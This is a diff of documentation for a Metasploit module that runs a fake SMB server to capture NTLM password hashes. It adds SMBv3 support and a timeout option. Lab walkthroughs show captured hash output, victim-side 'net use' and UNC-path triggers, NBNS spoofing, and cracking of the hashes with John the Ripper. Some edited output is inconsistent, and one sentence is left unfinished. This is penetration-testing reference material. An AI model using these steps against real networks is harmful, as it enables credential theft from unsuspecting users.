@@ -1,4 +1,4 @@
-This module creates a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. Supports SMBv1 & SMBv2, and captures NTLMv1 & NTLMv2 hashes.
+This module creates a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. Supports SMBv1, SMBv2, & SMBv3 and captures NTLMv1 & NTLMv2 hashes.
 
 
 
@@ -14,6 +14,8 @@ Microsoft provides an article on how to detect, disable, and enable SMB in vario
 6. Observe the capturing of hash
 7. `creds`
 8. check hash has been stored in DB correctly
+9. `hosts`
+10. check client IP has been added to the DB
 
 ## Options
 
@@ -27,11 +29,17 @@ The 8 byte server challenge. If unset or not a valid 16 character hexadecimal pa
 
 **JOHNPWFILE**
 
-A file to store John the Ripper formatted hashes in.
+A file to store John the Ripper formatted hashes in. NTLMv1 and NTLMv2 hashes will be stored in separate files.
+I.E. the filename john will produce two files, `john_netntlm` and `john_netntlmv2`.
 
 **DOMAIN**
 
 The domain name used during smb exchange.
+
+**TIMEOUT**
+
+Seconds that the server socket will wait for a response after the client has initiated communication. 
+This only applies to the server waiting on the client to respond with [a type3 message](http://davenport.sourceforge.net/ntlm.html#theType3Message).
 
 ## Scenarios
 
@@ -53,7 +61,7 @@ msf6 auxiliary(server/capture/smb) > run
 [+] Received SMB connection on Auth Capture Server!
 [SMB] NTLMv2-SSP Client   : 192.168.1.48
 [SMB] NTLMv2-SSP Username : WORKGROUP\kali
-[SMB] NTLMv2-SSP Hash     : kali::WORKGROUP:736a878aaa12787d:63b3d264cfcdff09b45f6bc05e5f8e47:01010000000000008060dc6c958fd70141b248fffd1ac50b000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008060dc6c958fd70106000400020000000800300030000000000000000000000000000000d68027f68e3bbafdb72e0ff445687858643dbad597210f1273fa58505bc4be360a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e0031003900360000000000
+[SMB] NTLMv2-SSP Hash     : kali::WORKGROUP:6ca4b2b2e5171437:f2857b13094f4a758bc448e1801dd86d:0101000000000000800fb2f5a792d70174175e23a95cd935000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800800fb2f5a792d70106000400020000000800300030000000000000000000000000000000d89391afb90f05c54afaef7d0bc25c7bf14aee2965d714c6fec0a626329cd8dc0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00380039002e00310000000000
 ```
 
 Client:
@@ -66,24 +74,22 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 
 Crack the Hash:
 
+(This hash is NTLMv2)
 ```
 # cat /tmp/john
-kali::WORKGROUP:736a878aaa12787d:63b3d264cfcdff09b45f6bc05e5f8e47:01010000000000008060dc6c958fd70141b248fffd1ac50b000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008060dc6c958fd70106000400020000000800300030000000000000000000000000000000d68027f68e3bbafdb72e0ff445687858643dbad597210f1273fa58505bc4be360a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e0031003900360000000000
+kali::WORKGROUP:6ca4b2b2e5171437:f2857b13094f4a758bc448e1801dd86d:0101000000000000800fb2f5a792d70174175e23a95cd935000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800800fb2f5a792d70106000400020000000800300030000000000000000000000000000000d89391afb90f05c54afaef7d0bc25c7bf14aee2965d714c6fec0a626329cd8dc0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00380039002e00310000000000
 # john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
-Will run 8 OpenMP threads
+Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-test             (ubuntu)
-1g 0:00:00:00 DONE (2019-09-25 22:46) 11.11g/s 1865Kp/s 1865Kc/s 1865KC/s 24782478..playpen
+jim              (kali)
+1g 0:00:00:00 DONE (2021-08-16 10:08) 5.555g/s 785066p/s 785066c/s 785066C/s katiekatie..charles14
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed
-
 ```
 
 ### Windows XP via net use
-
-Method also confirmed on Windows 2008r2
 
 Based off of [hackers-arise.com](https://web.archive.org/web/20210503073722/https://www.hackers-arise.com/post/2018/11/19/metasploit-basics-part-20-creating-a-fake-smb-server-to-capture-credentials)
 
@@ -116,9 +122,9 @@ Microsoft Windows XP [Version 5.1.2600]
 C:\Documents and Settings\test\Desktop>net use \\192.168.89.1 fake
 
 [+] Received SMB connection on Auth Capture Server!
-[SMB] NTLMv1-SSP Client   : 192.168.89.135
-[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
-[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:a24be400055ae1ef1a33f3ab7be1728952c359127a11df42:83468ec2e17ac10e1eccd724764111402c218c36f39ae0f4:1ab4f830af5ee914
+[SMB] NTLMv1-SSP Client     : 192.168.89.135
+[SMB] NTLMv1-SSP Username   : ADAM-9256FBF58E\Administrator
+[SMB] NTLMv1-SSP Hash       : Administrator::ADAM-9256FBF58E:440a272a2f9e82c9ec09d91931fa04152cef3cac3a5563d7:4a919f3243d06d6c9c14ebff4639455e294de86cbe2bb953:66092f7f74758d2f
 
 Logon failure: unknown user name or bad password.
 
@@ -126,11 +132,11 @@ Logon failure: unknown user name or bad password.
 C:\Documents and Settings\test\Desktop>
 ```
 
-We're now able to use John the Ripper to crack the password.
+We're now able to use John the Ripper to crack the password. As the above hash is NTLMv1, the format must be specified as 
 
 ```
 # cat /tmp/john_netntlm 
-test::WINXP:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c:1122334455667788
+Administrator::ADAM-9256FBF58E:440a272a2f9e82c9ec09d91931fa04152cef3cac3a5563d7:4a919f3243d06d6c9c14ebff4639455e294de86cbe2bb953:66092f7f74758d2f
 # john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Using default target encoding: CP850
@@ -183,7 +189,7 @@ msf6 auxiliary(server/capture/smb) > run
 [+] Received SMB connection on Auth Capture Server!
 [SMB] NTLMv1-SSP Client   : 192.168.89.135
 [SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
-[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:22f18e6b511c5249bfea193a6a456426bb0b6ddeea0ea7c2:2bc17238894d18eb455fdd9e8ec360c1ea3b33321d178a5f:b4c64af3688809f4
+[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:e588849d18b2a64c8fd6e26a755e5f5524ffb56c273553be:718bcfd52364e9abafc5af05ee5a60c4c068e7feda9cfe64:b3c8cdb98e907d1a
 ```
 
 Client:
@@ -195,29 +201,14 @@ Browse to the webpage.  This example is on Windows Server 2008r2 with Internet E
 Crack the password:
 
 ```
-# john /tmp/john_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
+# john /tmp/johnnbns_netntlm --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
-Loaded 17 password hashes with 17 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
-Remaining 15 password hashes with 15 different salts
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-15g 0:00:00:00 DONE (2019-09-26 14:06) 115.3g/s 283569p/s 4253Kc/s 4253KC/s dyesebel..holaz
-Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+adam             (adam)
+6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
+Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
 Session completed
 ```
 
@@ -254,7 +245,7 @@ msf6 auxiliary(spoof/nbns/nbns_response) >
 [+] Received SMB connection on Auth Capture Server!
 [SMB] NTLMv1-SSP Client   : 192.168.89.135
 [SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
-[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:603fd7b40a566fdb974dc56ef6da91bebd500cef4b7758dd:eb64ff6a5bfa268ef178d32835dbb07385fbb340ae3794fa:431f659ef973decc
+[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:e588849d18b2a64c8fd6e26a755e5f5524ffb56c273553be:718bcfd52364e9abafc5af05ee5a60c4c068e7feda9cfe64:b3c8cdb98e907d1a
 ```
 
 Victim:
@@ -266,19 +257,14 @@ Open Explorer and type \\fake
 Finally, Crack the password:
 
 ```
-# john /tmp/johnnbns_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
+# john /tmp/johnnbns_netntlm --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
-Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
-Password123      (Administrator)
+adam             (adam)
 6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
-Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
 Session completed
 ```
 
@@ -286,4 +272,3 @@ Session completed
 
 Another strategy is to create content which can entice a user to open, containing a UNC link, and
 thus creating an SMB connection.  To accomplish this, we use `auxiliary/docx/word_unc_injector`.
-
